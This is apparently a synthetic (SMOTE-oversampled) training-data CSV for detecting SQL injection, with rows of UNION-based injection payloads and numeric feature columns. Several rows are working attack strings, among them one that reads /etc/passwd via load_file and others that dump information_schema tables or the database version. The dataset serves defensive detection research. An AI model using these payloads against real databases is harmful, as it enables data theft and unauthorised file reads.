id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001099,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,2.8614332045111346,77.99241316563442,28.60075868343656,4.190446569410686,34.19013711532474,13.2128976184215,18.99241316563441,11.596965266253765,0.4350531153041558,0.17662583018830483,0.24059722921049392,0.14772382529704545,3.0,0.7984826331268824,2.600758683436559,0.0,0.39924131656344125,1.0,0.0,1.3992413165634412,0.0,0.0,1.0,5.0,1.0,0.3992413165634413,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.3992413165634411,0.0,0.39924131656344125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.798482633126882
SMOTE_001100,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,2.8525622465220057,63.64691733765898,24.572166788665267,4.2395557404395445,27.213916605667364,16.577334309322147,11.0,8.855666422669463,0.43048256965764564,0.25376466051297036,0.1737972201889122,0.14195554964047183,1.2139166056673656,0.0,2.3582501829979026,0.4278332113347314,0.0,0.0,0.2139166056673657,1.2139166056673658,0.0,0.21391660566736573,3.213916605667366,2.7860833943326346,1.0,0.0,0.7860833943326343,0.0,0.0,0.0,1.0,0.2139166056673657,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2139166056673657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.213916605667366
SMOTE_001101,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.60259594260387,55.512272219573205,20.45122722195732,3.9222889479344056,14.0,27.60981777565856,4.0,9.90245444391464,0.2542038537209821,0.49495537553482155,0.07262967249170915,0.17821109825248727,0.54877277804268,0.45122722195732,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.90245444391464,3.0,0.5487727780426799,0.4512272219573201,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001102,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.19703377979882183,100.19720256076509,28.0,3.681341038827065,25.19720256076509,40.19720256076509,21.654895518661093,13.147901920573817,0.25142213385167134,0.40113770708133706,0.2162645284162767,0.13117563065071497,1.0986012803825442,0.0,3.0,0.0,0.0,1.0,0.0,1.9506993598087279,0.0,0.0,6.049300640191273,4.049300640191272,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0493006401912721,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.049300640191272
SMOTE_001103,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000025,0.8211089546691948,61.63085183727148,20.0,3.6602422229925202,14.0,32.504681469817186,4.0,11.126170367454296,0.2378653511271883,0.5145615786473741,0.06796152889348236,0.17961154133195528,0.14563827209095082,0.8543617279090493,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.126170367454296,3.0,0.1456382720909507,0.8543617279090494,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001104,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.26802768763751367,67.86268352599794,25.0,4.24635178102357,27.0,21.49014682079835,11.0,8.372536705199588,0.39835841758387874,0.3160682927129177,0.1622941701267654,0.12327911957643818,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.372536705199588,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001105,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.8264800052568022,94.59479450101955,27.099132416836593,3.775396981377702,25.0,38.198264833673186,19.297397250509775,12.099132416836591,0.2653556974402854,0.4040948526507428,0.2028016188668804,0.12774783104209148,0.5495662084182958,0.4504337915817043,3.0,0.0,0.0,1.0,0.0,1.5495662084182957,0.0,0.0,5.549566208418296,4.0,0.5495662084182958,0.45043379158170427,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001106,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.20827562377694175,71.18734078706396,25.187340787063967,4.22661972176538,27.214103756644533,24.026762969580567,11.026762969580567,8.9197110912583,0.3821132476473519,0.3375594062749522,0.15490058183144034,0.12542676424625562,1.0802889087416996,0.0,2.9197110912583,0.0,0.0,0.026762969580566454,0.0,0.9732370304194337,0.0,0.0,3.919711091258301,2.946474060838867,1.0,0.0,0.9732370304194335,0.0,0.0,0.026762969580566565,0.9732370304194335,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.026762969580566377,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0267629695805667
SMOTE_001107,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.6413966446207735,61.120220379615084,24.085041321177826,4.202658771920575,25.017589529218625,18.170082642355656,10.542520660588915,7.390027547451885,0.40949864468753217,0.29270100124918524,0.1771318803133255,0.12066847374995712,0.8475068868629712,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.542520660588914,3.0,0.8475068868629712,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001108,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.6319875799762196,102.43388709815603,28.0,4.160482459979585,33.21694354907802,38.108471774539005,16.054235887269503,15.054235887269504,0.3231924533623606,0.3727830184983607,0.15692358480957377,0.14710094332970491,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.527117943634752,5.527117943634752,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5271179436347521,2.0,1.0,1.0,0.527117943634752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.527117943634752
SMOTE_001109,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,2.812955677828233,55.39188912572143,22.171170433525713,4.153576583932526,34.77928130780428,5.855852167628569,8.878377825144288,5.878377825144287,0.6467176351516947,0.08872503284285715,0.1597332608664846,0.10482407113896358,0.29279260838142873,0.0,0.8783778251442858,0.0,0.7072073916185713,0.0,0.0,1.0,0.0,0.7072073916185715,1.585585216762857,1.5855852167628575,0.2927926083814286,0.0,0.2927926083814285,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7072073916185713,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7072073916185714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.414414783237143
SMOTE_001110,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.16162439727376643,67.12322389098969,25.0,4.253011955290818,27.0,20.89857911279175,11.0,8.224644778197938,0.40261906848981616,0.3108923908716308,0.1640299908662214,0.12245854977233171,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.2246447781979377,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001111,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,2.5633849945448395,94.27866764918771,27.61930860558564,3.9968431207145394,50.375210677115916,4.1420741832430785,26.522765577657438,13.238617211171281,0.529152043716415,0.04269607769678846,0.28377795123268257,0.14437392735411406,3.0,1.2386172111712805,2.0,0.0,1.0,1.7613827888287192,0.0,1.2386172111712805,0.0,0.0,1.0,5.3806913944143595,1.0,0.6193086055856404,1.0,0.0,0.0,1.0,0.6193086055856404,0.0,0.0,0.0,0.0,2.0,1.0,1.3806913944143597,1.3806913944143595,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.761382788828719
SMOTE_001112,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.00131391631066497,61.007635513204704,23.00152710264094,4.027721368628704,27.0,16.006108410563762,11.0,7.0015271026409405,0.44257535006776105,0.262352908065831,0.18030847595353228,0.11476326591287565,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0015271026409396,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001113,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.6778178487638488,93.62241828172088,26.0,3.869465782754305,25.0,39.33180342620497,17.249426284826864,12.041188570689053,0.27020153586531404,0.41806241535218236,0.18379355934359978,0.12794248943890385,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.2082377141378107,0.0,0.0,5.832950856551243,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001114,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,4.4019499205227115,40.66943330997363,20.270368249518786,3.9575279796041243,18.44628887331575,6.729631750481214,8.95277618713909,6.540736499037573,0.4426747354829437,0.18366417809442365,0.22408498603365778,0.14957610038897484,0.6351841247593935,0.0,2.04722381286091,0.635184124759393,0.0,0.0,0.3175920623796965,1.3175920623796964,0.0,0.3175920623796966,1.270368249518787,2.6824079376203036,0.3175920623796967,0.0,0.6824079376203034,0.0,0.0,0.0,1.0,0.3175920623796965,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3175920623796965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3175920623796964
SMOTE_001115,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,3.145529349337523,56.53369679805773,21.61917742787776,3.977127548842412,31.733151600971134,6.476709711511042,12.352329028848896,5.971506456726656,0.574585720313676,0.09813196532592486,0.22301370953537064,0.10426860482502841,0.3238354855755521,0.0,0.9715064567266563,0.0,0.6761645144244479,0.6761645144244479,0.0,0.3238354855755521,0.0,0.0,0.9715064567266563,2.323835485575552,0.3238354855755521,0.0,0.3238354855755521,0.0,0.0,0.6761645144244479,0.3238354855755521,0.0,0.0,0.0,0.0,1.0,1.0,0.6761645144244479,0.6761645144244478,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6761645144244479,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.028493543273344
SMOTE_001116,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.21552540326250286,77.03988134473389,28.101994067236696,4.274442002365936,29.407976268946776,21.22392880684033,15.101994067236694,11.305982201710082,0.38335555491869283,0.27257936621661993,0.19733928520252103,0.1467257936621662,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.3059822017100822,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.05099703361834701,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.050997033618347
SMOTE_001117,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,0.6449388176366527,62.25326932267018,20.37467306773298,3.748603385126714,14.0,33.002615458136134,4.0,11.250653864534035,0.2263133737777645,0.5284239514666826,0.06466096393650414,0.18060171081904877,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.250653864534035,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001118,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.32196915952635896,76.65120538140773,28.0,4.264598279593787,29.0,21.390488742238098,15.0,11.260716639169644,0.37987447431761356,0.27677482950917764,0.1964867970608346,0.14686389911237419,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.3476221855595245,5.913094453610119,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.913094453610119,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001119,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,0.44198268367302807,53.103849963936185,20.575921720314533,3.866867438553496,34.47993476692878,0.09598695338575425,13.19197390677151,5.335954336850143,0.6506219766939657,0.001279826045143373,0.24888015221049953,0.09921804505039142,0.0,0.0,0.09598695338575514,0.0,1.0479934766928776,1.0,0.0,0.0,0.0,0.0,0.04799347669287757,2.239967383464388,0.0,0.0,0.04799347669287746,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0479934766928776,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9520065233071223,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001120,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.5913165753508273,99.42543315918309,28.381417309750653,4.197373409830248,60.28362210612206,3.8092913451246737,22.42787403537402,12.904645672562337,0.6058238691444573,0.03801908294980183,0.22560237764012275,0.13055467026561804,2.7139370176870106,1.8092913451246735,2.0,0.0,1.0953543274376631,1.9046456725623369,0.0,0.0,0.0,0.0,1.0,6.095354327437663,0.9046456725623369,0.9046456725623369,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.9046456725623373,1.9046456725623369,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.809291345124674
SMOTE_001121,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000003,0.22538092716722904,55.66684999967421,23.048793902415188,4.15179008636492,27.983735365861605,4.650585365535822,11.0,12.032529268276791,0.505385160062786,0.07899901422457825,0.1986107291673454,0.21700509654529032,1.9837353658616044,0.0,0.04879390241518644,1.967470731723209,0.0,0.0,0.9837353658616045,1.9837353658616044,0.0,0.9837353658616046,4.081323170691977,2.0162646341383956,1.0,0.0,0.016264634138395517,0.0,0.0,0.0,1.0,0.9837353658616045,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9837353658616045,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9837353658616044
SMOTE_001122,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,1.5236889432126535,68.67263455681734,26.336317278408675,4.284778233433263,27.668158639204336,20.0,12.336317278408675,8.668158639204337,0.40334507312723544,0.29208585357568656,0.17870556106674482,0.12586351223033324,1.6681586392043375,0.0,3.0,0.0,0.0,0.33407931960216875,0.0,1.0,0.0,0.0,2.3318413607956625,3.6681586392043375,1.0,0.0,1.0,0.0,0.0,0.33407931960216875,1.0,0.0,0.0,0.0,0.0,1.3340793196021687,1.0,0.33407931960216875,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6681586392043375
SMOTE_001123,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.7048728025328895,65.41854942067675,24.89428171285032,4.257303724549133,27.052859143574842,19.154253702802542,11.0,8.211436574299364,0.4143768234483932,0.2908566820857942,0.16842863811916137,0.12633785634665126,1.0528591435748411,0.0,2.8414225692754767,0.10571828714968201,0.0,0.0,0.052859143574841005,1.052859143574841,0.0,0.0528591435748412,3.052859143574841,2.947140856425159,1.0,0.0,0.9471408564251588,0.0,0.0,0.0,1.0,0.052859143574841005,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.052859143574841005,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0528591435748407
SMOTE_001124,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.3888316612319092,92.0645203114907,28.0,4.2074037254260785,32.900461785483586,29.751154463708968,15.975115446370896,13.437788615927243,0.3621410357427926,0.313944991339195,0.17783828530975235,0.14607568760826006,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.4377886159272424,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.4875577231854484,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.487557723185448
SMOTE_001125,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.5429280511327956,74.80886481809932,28.191135181900673,4.282896401514097,29.0,20.0,15.0,10.808864818099329,0.3876653910405621,0.26735544209693934,0.20051658157270452,0.14446258528979405,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,5.808864818099328,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.808864818099328,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001126,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,1.0526989877594801,59.90026105581886,23.200042333376032,4.112644803733178,23.100091722314733,19.20011288900275,10.100021166688016,7.500035277813359,0.3897263727329068,0.30720867845051475,0.1790383725024199,0.12402657631415856,0.7000070555626718,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.8000282222506874,3.0,0.700007055562672,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001127,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,0.4185864455976262,85.6784489906545,27.937835222568353,3.9857329222931064,43.367625103496266,3.186494332294945,25.248659109726592,13.875670445136704,0.5047603658393605,0.03685437333127539,0.2953588739222084,0.1630263869071557,3.0,1.8756704451367032,2.0,0.0,1.0,1.1243295548632966,0.0,1.8756704451367034,0.0,0.0,1.0,5.062164777431648,1.0,0.9378352225683517,1.0,0.0,0.0,1.0,0.9378352225683517,0.0,0.0,0.0,0.0,2.0,1.0,1.0621647774316483,1.062164777431648,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.124329554863296
SMOTE_001128,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.7487828513721708,64.32120184681123,23.916951650834253,4.154644631891592,24.65339524347422,21.111871068891347,10.458475825417128,8.097459709028545,0.38596462817844496,0.31948384489139015,0.16943602456076737,0.1251155023693975,0.8194919418057092,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.2779677672228367,3.0,0.8194919418057092,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001129,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.0560605479499031,61.20748729107979,23.082994916431915,4.037350737190971,27.0,16.16598983286383,11.0,7.041497458215957,0.441231456319137,0.2639854901011965,0.17976096368557437,0.11502208989409213,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0414974582159573,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
